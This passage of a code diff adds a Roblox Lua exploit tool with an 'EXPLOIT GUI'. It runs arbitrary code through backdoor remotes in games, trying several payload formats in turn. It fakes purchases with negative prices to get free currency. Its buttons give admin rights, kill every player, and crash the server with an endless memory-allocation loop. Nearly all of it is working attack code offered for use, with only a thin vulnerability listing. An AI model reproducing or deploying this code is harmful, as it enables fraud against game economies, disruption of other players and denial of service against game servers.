+        end
+    end)
+end
+
+-- Find other vulnerabilities based on scan data
+function ExploitEngine:FindVulnerabilities()
+    -- Add all vulnerabilities from the vulnerabilities data
+    for _, vuln in ipairs(SecurityData.vulnerabilities) do
+        table.insert(self.Vulnerabilities, {
+            name = vuln.Name,
+            description = vuln.Description,
+            path = vuln.Path,
+            recommendation = vuln.Recommendation,
+            riskLevel = vuln.RiskLevel
+        })
+        print("Found vulnerability:", vuln.Name)
+    end
+
+    -- Check for FilteringEnabled
+    local success, result = pcall(function()
+        return game.Workspace.FilteringEnabled
+    end)
+
+    if success and result == false then
+        -- Check if we already found this vulnerability
+        local alreadyFound = false
+        for _, vuln in ipairs(self.Vulnerabilities) do
+            if vuln.name == "FilteringEnabled Disabled" then
+                alreadyFound = true
+                break
+            end
+        end
+
+        if not alreadyFound then
+            table.insert(self.Vulnerabilities, {
+                name = "FilteringEnabled Disabled",
+                description = "The game has FilteringEnabled turned off, which allows clients to directly modify the game state.",
+                recommendation = "Enable FilteringEnabled to prevent clients from directly modifying the server game state.",
+                riskLevel = "High"
+            })
+            print("Found vulnerability: FilteringEnabled Disabled")
+        end
+    end
+end
+
+-- Execute backdoor
+function ExploitEngine:ExecuteBackdoor(backdoorName, payload)
+    for _, backdoor in ipairs(self.Backdoors) do
+        if backdoor.name:lower() == backdoorName:lower() or backdoorName == "any" then
+            if backdoor.remote:IsA("RemoteFunction") then
+                return pcall(function()
+                    return backdoor.remote:InvokeServer(payload)
+                end)
+            else
+                return pcall(function()
+                    backdoor.remote:FireServer(payload)
+                    return true
+                end)
+            end
+        end
+    end
+
+    return false, "Backdoor not found"
+end
+
+-- Execute code through backdoor
+function ExploitEngine:ExecuteCode(code)
+    -- First try backdoors specifically for code execution
+    for _, backdoor in ipairs(self.Backdoors) do
+        if backdoor.name:lower():find("execute") or backdoor.name:lower():find("script") or backdoor.name:lower():find("eval") or backdoor.name:lower():find("command") then
+            if backdoor.remote:IsA("RemoteFunction") then
+                local success, result = pcall(function()
+                    return backdoor.remote:InvokeServer({
+                        type = "execute",
+                        source = code
+                    })
+                end)
+
+                if success then
+                    print("Code executed through", backdoor.name)
+                    return success, result
+                end
+
+                -- Try different payload formats
+                success, result = pcall(function()
+                    return backdoor.remote:InvokeServer(code)
+                end)
+
+                if success then
+                    print("Code executed through", backdoor.name, "(direct payload)")
+                    return success, result
+                end
+
+                success, result = pcall(function()
+                    return backdoor.remote:InvokeServer("execute", code)
+                end)
+
+                if success then
+                    print("Code executed through", backdoor.name, "(command format)")
+                    return success, result
+                end
+            else
+                local success, result = pcall(function()
+                    backdoor.remote:FireServer({
+                        type = "execute",
+                        source = code
+                    })
+                    return true
+                end)
+
+                if success then
+                    print("Code executed through", backdoor.name)
+                    return success, result
+                end
+
+                -- Try different payload formats
+                success, result = pcall(function()
+                    backdoor.remote:FireServer(code)
+                    return true
+                end)
+
+                if success then
+                    print("Code executed through", backdoor.name, "(direct payload)")
+                    return success, result
+                end
+
+                success, result = pcall(function()
+                    backdoor.remote:FireServer("execute", code)
+                    return true
+                end)
+
+                if success then
+                    print("Code executed through", backdoor.name, "(command format)")
+                    return success, result
+                end
+            end
+        end
+    end
+
+    -- Try CmdrFunction as fallback
+    for _, backdoor in ipairs(self.Backdoors) do
+        if backdoor.name == "CmdrFunction" then
+            local success, result = pcall(function()
+                return backdoor.remote:InvokeServer({
+                    type = "command",
+                    command = "lua " .. code
+                })
+            end)
+
+            if success then
+                print("Code executed through CmdrFunction")
+                return success, result
+            end
+
+            -- Try different payload formats
+            success, result = pcall(function()
+                return backdoor.remote:InvokeServer("lua", code)
+            end)
+
+            if success then
+                print("Code executed through CmdrFunction (command format)")
+                return success, result
+            end
+        end
+    end
+
+    -- Try any backdoor as last resort
+    for _, backdoor in ipairs(self.Backdoors) do
+        if backdoor.remote:IsA("RemoteFunction") then
+            local success, result = pcall(function()
+                return backdoor.remote:InvokeServer(code)
+            end)
+
+            if success then
+                print("Code executed through", backdoor.name, "(last resort)")
+                return success, result
+            end
+        else
+            local success, result = pcall(function()
+                backdoor.remote:FireServer(code)
+                return true
+            end)
+
+            if success then
+                print("Code executed through", backdoor.name, "(last resort)")
+                return success, result
+            end
+        end
+    end
+
+    return false, "No suitable backdoor found for code execution"
+end
+
+-- Exploit specific economy remote
+function ExploitEngine:ExploitEconomyRemote(remoteName, amount, itemName)
+    -- Find the specific economy remote
+    local targetRemote = nil
+    local remoteInfo = nil
+
+    for _, exploit in ipairs(self.EconomyExploits) do
+        if exploit.name:lower() == remoteName:lower() then
+            targetRemote = exploit.remote
+            remoteInfo = exploit
+            break
+        end
+    end
+
+    if not targetRemote then
+        return false, "Economy remote not found: " .. remoteName
+    end
+
+    -- Default values
+    amount = amount or 999999
+    itemName = itemName or "VIP_Item"
+
+    -- Different payload formats based on the remote name
+    if remoteName:lower():find("buy") then
+        -- Buy item exploit
+        if targetRemote:IsA("RemoteFunction") then
+            local success, result = pcall(function()
+                return targetRemote:InvokeServer({
+                    item = itemName,
+                    price = -amount, -- Negative price to get money
+                    quantity = 1
+                })
+            end)
+
+            if success then
+                print("Buy exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                return targetRemote:InvokeServer(itemName, -amount, 1)
+            end)
+
+            if success then
+                print("Buy exploit executed through", remoteName, "(direct parameters)")
+                return success, result
+            end
+        else
+            local success, result = pcall(function()
+                targetRemote:FireServer({
+                    item = itemName,
+                    price = -amount, -- Negative price to get money
+                    quantity = 1
+                })
+                return true
+            end)
+
+            if success then
+                print("Buy exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                targetRemote:FireServer(itemName, -amount, 1)
+                return true
+            end)
+
+            if success then
+                print("Buy exploit executed through", remoteName, "(direct parameters)")
+                return success, result
+            end
+        end
+    elseif remoteName:lower():find("sell") then
+        -- Sell item exploit
+        if targetRemote:IsA("RemoteFunction") then
+            local success, result = pcall(function()
+                return targetRemote:InvokeServer({
+                    item = itemName,
+                    price = amount,
+                    quantity = 999
+                })
+            end)
+
+            if success then
+                print("Sell exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                return targetRemote:InvokeServer(itemName, amount, 999)
+            end)
+
+            if success then
+                print("Sell exploit executed through", remoteName, "(direct parameters)")
+                return success, result
+            end
+        else
+            local success, result = pcall(function()
+                targetRemote:FireServer({
+                    item = itemName,
+                    price = amount,
+                    quantity = 999
+                })
+                return true
+            end)
+
+            if success then
+                print("Sell exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                targetRemote:FireServer(itemName, amount, 999)
+                return true
+            end)
+
+            if success then
+                print("Sell exploit executed through", remoteName, "(direct parameters)")
+                return success, result
+            end
+        end
+    elseif remoteName:lower():find("update") then
+        -- Update stock/value exploit
+        if targetRemote:IsA("RemoteFunction") then
+            local success, result = pcall(function()
+                return targetRemote:InvokeServer({
+                    currency = amount,
+                    update = true
+                })
+            end)
+
+            if success then
+                print("Update exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                return targetRemote:InvokeServer(amount)
+            end)
+
+            if success then
+                print("Update exploit executed through", remoteName, "(direct amount)")
+                return success, result
+            end
+        else
+            local success, result = pcall(function()
+                targetRemote:FireServer({
+                    currency = amount,
+                    update = true
+                })
+                return true
+            end)
+
+            if success then
+                print("Update exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                targetRemote:FireServer(amount)
+                return true
+            end)
+
+            if success then
+                print("Update exploit executed through", remoteName, "(direct amount)")
+                return success, result
+            end
+        end
+    elseif remoteName:lower():find("purchase") then
+        -- Purchase exploit
+        if targetRemote:IsA("RemoteFunction") then
+            local success, result = pcall(function()
+                return targetRemote:InvokeServer({
+                    item = itemName,
+                    cost = -amount,
+                    purchase = true
+                })
+            end)
+
+            if success then
+                print("Purchase exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                return targetRemote:InvokeServer(itemName, -amount)
+            end)
+
+            if success then
+                print("Purchase exploit executed through", remoteName, "(direct parameters)")
+                return success, result
+            end
+        else
+            local success, result = pcall(function()
+                targetRemote:FireServer({
+                    item = itemName,
+                    cost = -amount,
+                    purchase = true
+                })
+                return true
+            end)
+
+            if success then
+                print("Purchase exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try different payload format
+            success, result = pcall(function()
+                targetRemote:FireServer(itemName, -amount)
+                return true
+            end)
+
+            if success then
+                print("Purchase exploit executed through", remoteName, "(direct parameters)")
+                return success, result
+            end
+        end
+    else
+        -- Generic economy exploit
+        if targetRemote:IsA("RemoteFunction") then
+            local success, result = pcall(function()
+                return targetRemote:InvokeServer(amount)
+            end)
+
+            if success then
+                print("Generic exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try table format
+            success, result = pcall(function()
+                return targetRemote:InvokeServer({
+                    amount = amount,
+                    item = itemName
+                })
+            end)
+
+            if success then
+                print("Generic exploit executed through", remoteName, "(table format)")
+                return success, result
+            end
+        else
+            local success, result = pcall(function()
+                targetRemote:FireServer(amount)
+                return true
+            end)
+
+            if success then
+                print("Generic exploit executed through", remoteName)
+                return success, result
+            end
+
+            -- Try table format
+            success, result = pcall(function()
+                targetRemote:FireServer({
+                    amount = amount,
+                    item = itemName
+                })
+                return true
+            end)
+
+            if success then
+                print("Generic exploit executed through", remoteName, "(table format)")
+                return success, result
+            end
+        end
+    end
+
+    return false, "Failed to exploit economy remote: " .. remoteName
+end
+
+-- Get free money using any available method
+function ExploitEngine:GetMoney(amount)
+    local amt = amount or 999999
+
+    -- Try each economy exploit one by one
+    for _, exploit in ipairs(self.EconomyExploits) do
+        local success, result = self:ExploitEconomyRemote(exploit.name, amt)
+
+        if success then
+            return success, "Money added through " .. exploit.name
+        end
+    end
+
+    -- If all direct exploits fail, try backdoor execution
+    local success, result = self:ExecuteCode([[
+        local Players = game:GetService("Players")
+        local targetPlayer = Players:FindFirstChild("]] .. Player.Name .. [[")
+
+        if targetPlayer then
+            -- Try to find money/currency value in player data
+            local success = false
+
+            -- Common paths for player money
+            local paths = {
+                targetPlayer.leaderstats,
+                targetPlayer.Data,
+                targetPlayer.PlayerData,
+                targetPlayer.Currency,
+                targetPlayer.Economy
+            }
+
+            for _, path in ipairs(paths) do
+                if path then
+                    for _, child in pairs(path:GetChildren()) do
+                        if child.Name:lower():find("money") or
+                           child.Name:lower():find("cash") or
+                           child.Name:lower():find("coin") or
+                           child.Name:lower():find("currency") then
+
+                            if child:IsA("IntValue") or child:IsA("NumberValue") then
+                                child.Value = child.Value + ]] .. amt .. [[
+                                success = true
+                            end
+                        end
+                    end
+                end
+            end
+
+            return success and "Added ]] .. amt .. [[ money to " .. targetPlayer.Name or "Could not find money value"
+        else
+            return "Player not found"
+        end
+    ]])
+
+    return success, result
+end
+
+-- GUI Creation
+local ExploitGUI = {}
+
+function ExploitGUI:Create(exploitEngine)
+    self.Engine = exploitEngine
+
+    -- Create the main ScreenGui
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "ExploitGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    -- Try to parent to CoreGui, fallback to PlayerGui
+    local success = pcall(function()
+        ScreenGui.Parent = CoreGui
+    end)
+    if not success then
+        ScreenGui.Parent = PlayerGui
+    end
+
+    -- Create main frame
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0.95, 0, 0.85, 0)
+    MainFrame.Position = UDim2.new(0.025, 0, 0.075, 0)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Visible = false
+    MainFrame.Parent = ScreenGui
+
+    local Corner = Instance.new("UICorner")
+    Corner.CornerRadius = UDim.new(0, 15)
+    Corner.Parent = MainFrame
+
+    -- Animated border
+    local Border = Instance.new("UIStroke")
+    Border.Color = Color3.fromRGB(220, 20, 60)
+    Border.Thickness = 2
+    Border.Parent = MainFrame
+
+    -- Header with exploit branding
+    local Header = Instance.new("Frame")
+    Header.Name = "Header"
+    Header.Size = UDim2.new(1, 0, 0, 70)
+    Header.Position = UDim2.new(0, 0, 0, 0)
+    Header.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Header.BorderSizePixel = 0
+    Header.Parent = MainFrame
+
+    local HeaderCorner = Instance.new("UICorner")
+    HeaderCorner.CornerRadius = UDim.new(0, 15)
+    HeaderCorner.Parent = Header
+
+    local Title = Instance.new("TextLabel")
+    Title.Name = "Title"
+    Title.Size = UDim2.new(0.8, 0, 1, 0)
+    Title.Position = UDim2.new(0, 15, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "⚡ EXPLOIT GUI"
+    Title.TextColor3 = Color3.fromRGB(220, 20, 60)
+    Title.TextScaled = true
+    Title.Font = Enum.Font.SourceSansBold
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Parent = Header
+
+    -- Close button
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Name = "CloseButton"
+    CloseButton.Size = UDim2.new(0, 50, 0, 50)
+    CloseButton.Position = UDim2.new(1, -60, 0, 10)
+    CloseButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    CloseButton.BorderSizePixel = 0
+    CloseButton.Text = "✕"
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.TextScaled = true
+    CloseButton.Font = Enum.Font.SourceSansBold
+    CloseButton.Parent = Header
+
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 25)
+    CloseCorner.Parent = CloseButton
+
+    -- Create tab container
+    local TabContainer = Instance.new("Frame")
+    TabContainer.Name = "TabContainer"
+    TabContainer.Size = UDim2.new(1, -20, 0, 60)
+    TabContainer.Position = UDim2.new(0, 10, 0, 80)
+    TabContainer.BackgroundTransparency = 1
+    TabContainer.Parent = MainFrame
+
+    local TabLayout = Instance.new("UIListLayout")
+    TabLayout.FillDirection = Enum.FillDirection.Horizontal
+    TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+    TabLayout.Padding = UDim.new(0, 8)
+    TabLayout.Parent = TabContainer
+
+    -- Create content area
+    local ContentFrame = Instance.new("ScrollingFrame")
+    ContentFrame.Name = "ContentFrame"
+    ContentFrame.Size = UDim2.new(1, -20, 1, -160)
+    ContentFrame.Position = UDim2.new(0, 10, 0, 150)
+    ContentFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    ContentFrame.BorderSizePixel = 0
+    ContentFrame.ScrollBarThickness = 10
+    ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(220, 20, 60)
+    ContentFrame.CanvasSize = UDim2.new(0, 0, 4, 0)
+    ContentFrame.Parent = MainFrame
+
+    local ContentCorner = Instance.new("UICorner")
+    ContentCorner.CornerRadius = UDim.new(0, 10)
+    ContentCorner.Parent = ContentFrame
+
+    local ContentLayout = Instance.new("UIListLayout")
+    ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    ContentLayout.Padding = UDim.new(0, 15)
+    ContentLayout.Parent = ContentFrame
+
+    local ContentPadding = Instance.new("UIPadding")
+    ContentPadding.PaddingTop = UDim.new(0, 20)
+    ContentPadding.PaddingBottom = UDim.new(0, 20)
+    ContentPadding.PaddingLeft = UDim.new(0, 20)
+    ContentPadding.PaddingRight = UDim.new(0, 20)
+    ContentPadding.Parent = ContentFrame
+
+    -- Create tabs
+    local exploitCategories = {
+        {name = "Admin", icon = "👑", color = Color3.fromRGB(220, 20, 60)},
+        {name = "Teleport", icon = "🌀", color = Color3.fromRGB(70, 130, 180)},
+        {name = "Items", icon = "🎁", color = Color3.fromRGB(255, 165, 0)},
+        {name = "Money", icon = "💰", color = Color3.fromRGB(50, 205, 50)},
+        {name = "Execute", icon = "⚙️", color = Color3.fromRGB(138, 43, 226)}
+    }
+
+    local tabs = {}
+
+    for i, category in ipairs(exploitCategories) do
+        local Tab = Instance.new("TextButton")
+        Tab.Name = category.name .. "Tab"
+        Tab.Size = UDim2.new(0, 140, 1, 0)
+        Tab.BackgroundColor3 = i == 1 and category.color or Color3.fromRGB(40, 40, 40)
+        Tab.BorderSizePixel = 0
+        Tab.Text = category.icon .. " " .. category.name
+        Tab.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Tab.TextScaled = true
+        Tab.Font = Enum.Font.SourceSansBold
+        Tab.Parent = TabContainer
+
+        local TabCorner = Instance.new("UICorner")
+        TabCorner.CornerRadius = UDim.new(0, 10)
+        TabCorner.Parent = Tab
+
+        tabs[category.name] = {button = Tab, color = category.color}
+    end
+
+    -- Create floating button
+    local FloatingButton = Instance.new("Frame")
+    FloatingButton.Name = "FloatingButton"
+    FloatingButton.Size = UDim2.new(0, 90, 0, 90)
+    FloatingButton.Position = UDim2.new(1, -110, 0.5, -45)
+    FloatingButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+    FloatingButton.BorderSizePixel = 0
+    FloatingButton.Active = true
+    FloatingButton.Draggable = true
+    FloatingButton.Parent = ScreenGui
+
+    local ButtonCorner = Instance.new("UICorner")
+    ButtonCorner.CornerRadius = UDim.new(0, 45)
+    ButtonCorner.Parent = FloatingButton
+
+    -- Animated gradient
+    local Gradient = Instance.new("UIGradient")
+    Gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 20, 60)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0))
+    }
+    Gradient.Rotation = 0
+    Gradient.Parent = FloatingButton
+
+    -- Rotating gradient animation
+    local rotateInfo = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
+    local rotateTween = TweenService:Create(Gradient, rotateInfo, {Rotation = 360})
+    rotateTween:Play()
+
+    -- Exploit icon
+    local Icon = Instance.new("TextLabel")
+    Icon.Name = "Icon"
+    Icon.Size = UDim2.new(0.8, 0, 0.8, 0)
+    Icon.Position = UDim2.new(0.1, 0, 0.1, 0)
+    Icon.BackgroundTransparency = 1
+    Icon.Text = "⚡"
+    Icon.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Icon.TextScaled = true
+    Icon.Font = Enum.Font.SourceSansBold
+    Icon.Parent = FloatingButton
+
+    -- Status indicator
+    local StatusDot = Instance.new("Frame")
+    StatusDot.Name = "StatusDot"
+    StatusDot.Size = UDim2.new(0, 20, 0, 20)
+    StatusDot.Position = UDim2.new(1, -25, 0, 5)
+    StatusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    StatusDot.BorderSizePixel = 0
+    StatusDot.Parent = FloatingButton
+
+    local DotCorner = Instance.new("UICorner")
+    DotCorner.CornerRadius = UDim.new(0, 10)
+    DotCorner.Parent = StatusDot
+
+    -- Pulsing animation for status dot
+    local pulseInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+    local pulseTween = TweenService:Create(StatusDot, pulseInfo, {BackgroundTransparency = 0.5})
+    pulseTween:Play()
+
+    -- Store references
+    self.ScreenGui = ScreenGui
+    self.MainFrame = MainFrame
+    self.ContentFrame = ContentFrame
+    self.FloatingButton = FloatingButton
+    self.CloseButton = CloseButton
+    self.Tabs = tabs
+    self.CurrentCategory = "Admin"
+
+    -- Set up floating button to open interface
+    FloatingButton.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            self:ToggleMainInterface(true)
+        end
+    end)
+
+    -- Set up close button
+    CloseButton.MouseButton1Click:Connect(function()
+        self:ToggleMainInterface(false)
+    end)
+
+    -- Set up tab switching
+    for categoryName, tabData in pairs(tabs) do
+        tabData.button.MouseButton1Click:Connect(function()
+            print("Tab clicked: " .. categoryName)
+
+            -- Update tab appearance
+            for _, otherTabData in pairs(tabs) do
+                otherTabData.button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            end
+            tabData.button.BackgroundColor3 = tabData.color
+
+            -- Update current category
+            self.CurrentCategory = categoryName
+
+            -- Clear existing content
+            for _, child in pairs(self.ContentFrame:GetChildren()) do
+                if child:IsA("Frame") and child.Name == "Card" then
+                    child:Destroy()
+                end
+            end
+
+            -- Create new content
+            self:CreateContent(categoryName)
+        end)
+    end
+
+    -- Mobile optimization
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        MainFrame.Size = UDim2.new(0.98, 0, 0.9, 0)
+        MainFrame.Position = UDim2.new(0.01, 0, 0.05, 0)
+        FloatingButton.Size = UDim2.new(0, 80, 0, 80)
+    end
+
+    -- Create initial content
+    self:CreateContent(self.CurrentCategory)
+
+    -- Show notification
+    self:ShowNotification("⚡ EXPLOIT GUI LOADED", "Found " .. #self.Engine.Backdoors .. " backdoors, " ..
+                         #self.Engine.RemoteEvents .. " remote events, " ..
+                         #self.Engine.RemoteFunctions .. " remote functions, and " ..
+                         #self.Engine.EconomyExploits .. " economy exploits")
+
+    return self
+end
+
+function ExploitGUI:ToggleMainInterface(show)
+    if show and not self.MainFrame.Visible then
+        self.MainFrame.Visible = true
+        self.MainFrame.Position = UDim2.new(0.025, 0, -0.85, 0)
+
+        local interfaceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+        local interfaceTween = TweenService:Create(self.MainFrame, interfaceInfo, {
+            Position = UDim2.new(0.025, 0, 0.075, 0)
+        })
+
+        interfaceTween:Play()
+    elseif not show and self.MainFrame.Visible then
+        local interfaceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+        local interfaceTween = TweenService:Create(self.MainFrame, interfaceInfo, {
+            Position = UDim2.new(0.025, 0, -0.85, 0)
+        })
+
+        interfaceTween:Play()
+
+        interfaceTween.Completed:Connect(function()
+            self.MainFrame.Visible = false
+        end)
+    end
+end
+
+function ExploitGUI:CreateContent(category)
+    if category == "Admin" then
+        self:CreateAdminContent()
+    elseif category == "Teleport" then
+        self:CreateTeleportContent()
+    elseif category == "Items" then
+        self:CreateItemsContent()
+    elseif category == "Money" then
+        self:CreateMoneyContent()
+    elseif category == "Execute" then
+        self:CreateExecuteContent()
+    end
+
+    -- Update canvas size
+    local totalHeight = 0
+    local cardCount = 0
+
+    for _, child in pairs(self.ContentFrame:GetChildren()) do
+        if child:IsA("Frame") and child.Name == "Card" then
+            totalHeight = totalHeight + child.Size.Y.Offset
+            cardCount = cardCount + 1
+        end
+    end
+
+    if self.ContentFrame:FindFirstChild("UIListLayout") then
+        totalHeight = totalHeight + (self.ContentFrame.UIListLayout.Padding.Offset * (cardCount - 1))
+    end
+
+    -- Set minimum canvas size
+    if totalHeight < 100 then
+        totalHeight = 800 -- Default size if no content
+    end
+
+    self.ContentFrame.CanvasSize = UDim2.new(0, 0, 0, totalHeight + 100)
+end
+
+function ExploitGUI:CreateAdminContent()
+    -- Give Admin Card
+    local AdminCard = self:CreateCard("Give Admin", "Give yourself or others admin permissions using backdoors")
+
+    local PlayerInput = self:CreateTextInput(AdminCard, "Player Name (leave empty for self)")
+    PlayerInput.Position = UDim2.new(0, 20, 0, 100)
+
+    local GiveAdminButton = self:CreateButton(AdminCard, "GIVE ADMIN", Color3.fromRGB(220, 20, 60))
+    GiveAdminButton.Position = UDim2.new(0, 20, 0, 150)
+
+    local StatusLabel = self:CreateStatusLabel(AdminCard)
+
+    GiveAdminButton.MouseButton1Click:Connect(function()
+        StatusLabel.Text = "Giving admin..."
+
+        local playerName = PlayerInput.Text
+        if playerName == "" then
+            playerName = Player.Name
+        end
+
+        local success, result = self.Engine:GiveAdmin(playerName)
+
+        StatusLabel.Text = success and "Admin given successfully! " .. tostring(result) or "Failed: " .. tostring(result)
+        StatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Kill Player Card
+    local KillCard = self:CreateCard("Kill Players", "Kill a specific player or all players")
+    KillCard.LayoutOrder = 1
+
+    local KillPlayerInput = self:CreateTextInput(KillCard, "Player Name (or 'all' for everyone)")
+    KillPlayerInput.Position = UDim2.new(0, 20, 0, 100)
+    KillPlayerInput.Text = "all"
+
+    local KillButton = self:CreateButton(KillCard, "KILL", Color3.fromRGB(220, 20, 60))
+    KillButton.Position = UDim2.new(0, 20, 0, 150)
+
+    local KillStatusLabel = self:CreateStatusLabel(KillCard)
+
+    KillButton.MouseButton1Click:Connect(function()
+        KillStatusLabel.Text = "Killing players..."
+
+        local playerName = KillPlayerInput.Text
+        if playerName == "" then
+            playerName = "all"
+        end
+
+        -- Execute code to kill players
+        local success, result = self.Engine:ExecuteCode([[
+            local Players = game:GetService("Players")
+
+            local function killPlayer(player)
+                if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+                    player.Character.Humanoid.Health = 0
+                    return true
+                end
+                return false
+            end
+
+            local killCount = 0
+
+            if "]] .. playerName .. [[" == "all" then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if killPlayer(player) then
+                        killCount = killCount + 1
+                    end
+                end
+                return "Killed " .. killCount .. " players"
+            else
+                local targetPlayer = Players:FindFirstChild("]] .. playerName .. [[")
+                if targetPlayer then
+                    if killPlayer(targetPlayer) then
+                        return "Killed " .. targetPlayer.Name
+                    else
+                        return "Failed to kill " .. targetPlayer.Name
+                    end
+                else
+                    return "Player not found"
+                end
+            end
+        ]])
+
+        KillStatusLabel.Text = success and "Players killed successfully! " .. tostring(result) or "Failed: " .. tostring(result)
+        KillStatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Crash Server Card
+    local CrashCard = self:CreateCard("Crash Server", "Attempt to crash the game server")
+    CrashCard.LayoutOrder = 2
+
+    local CrashWarning = Instance.new("TextLabel")
+    CrashWarning.Name = "CrashWarning"
+    CrashWarning.Size = UDim2.new(1, -40, 0, 40)
+    CrashWarning.Position = UDim2.new(0, 20, 0, 100)
+    CrashWarning.BackgroundTransparency = 1
+    CrashWarning.Text = "WARNING: This will disconnect everyone including you!"
+    CrashWarning.TextColor3 = Color3.fromRGB(255, 165, 0)
+    CrashWarning.TextSize = 16
+    CrashWarning.Font = Enum.Font.SourceSansBold
+    CrashWarning.TextWrapped = true
+    CrashWarning.Parent = CrashCard
+
+    local CrashButton = self:CreateButton(CrashCard, "CRASH SERVER", Color3.fromRGB(220, 20, 60))
+    CrashButton.Position = UDim2.new(0, 20, 0, 150)
+
+    local CrashStatusLabel = self:CreateStatusLabel(CrashCard)
+
+    CrashButton.MouseButton1Click:Connect(function()
+        CrashStatusLabel.Text = "Attempting to crash server..."
+
+        -- Try backdoor execution with infinite loop
+        local success, result = self.Engine:ExecuteCode([[
+            -- Create an infinite loop with memory allocation to crash the server
+            local function crashServer()
+                local data = {}
+                while true do
+                    for i = 1, 1000000 do
+                        table.insert(data, string.rep("a", 1000))
+                    end
+                end
+            end
+
+            -- Run the crash function
+            crashServer()
+        ]])
+
+        CrashStatusLabel.Text = success and "Crash attempt sent!" or "Failed: " .. tostring(result)
+        CrashStatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Backdoors Card
+    local BackdoorsCard = self:CreateCard("Available Backdoors", "List of backdoors found in the game")
+    BackdoorsCard.LayoutOrder = 3
+    BackdoorsCard.Size = UDim2.new(1, -40, 0, 100 + math.min(#self.Engine.Backdoors, 5) * 30)
+
+    local backdoorY = 100
+    for i, backdoor in ipairs(self.Engine.Backdoors) do
+        if i <= 5 then -- Limit to 5 backdoors to avoid making the card too large
+            local BackdoorLabel = Instance.new("TextLabel")
+            BackdoorLabel.Name = "Backdoor" .. i
+            BackdoorLabel.Size = UDim2.new(1, -40, 0, 20)
+            BackdoorLabel.Position = UDim2.new(0, 20, 0, backdoorY)
+            BackdoorLabel.BackgroundTransparency = 1
+            BackdoorLabel.Text = backdoor.name .. " (" .. backdoor.type .. ") - " .. backdoor.path
+            BackdoorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            BackdoorLabel.TextSize = 14
+            BackdoorLabel.Font = Enum.Font.SourceSans
+            BackdoorLabel.TextXAlignment = Enum.TextXAlignment.Left
+            BackdoorLabel.Parent = BackdoorsCard
+
+            backdoorY = backdoorY + 30
+        end
+    end
+
+    if #self.Engine.Backdoors == 0 then
+        local NoBackdoorsLabel = Instance.new("TextLabel")
+        NoBackdoorsLabel.Name = "NoBackdoorsLabel"
+        NoBackdoorsLabel.Size = UDim2.new(1, -40, 0, 20)
+        NoBackdoorsLabel.Position = UDim2.new(0, 20, 0, 100)
+        NoBackdoorsLabel.BackgroundTransparency = 1
+        NoBackdoorsLabel.Text = "No backdoors found in the game"
+        NoBackdoorsLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        NoBackdoorsLabel.TextSize = 14
+        NoBackdoorsLabel.Font = Enum.Font.SourceSans
+        NoBackdoorsLabel.TextXAlignment = Enum.TextXAlignment.Left
+        NoBackdoorsLabel.Parent = BackdoorsCard
+    end
+
+    -- Show All Backdoors Button
+    if #self.Engine.Backdoors > 5 then
+        local ShowAllButton = self:CreateButton(BackdoorsCard, "SHOW ALL", Color3.fromRGB(70, 130, 180))
+        ShowAllButton.Position = UDim2.new(0, 20, 0, backdoorY + 10)
+
+        ShowAllButton.MouseButton1Click:Connect(function()
+            -- Create a full list view
+            local ListFrame = Instance.new("Frame")
+            ListFrame.Name = "BackdoorListFrame"
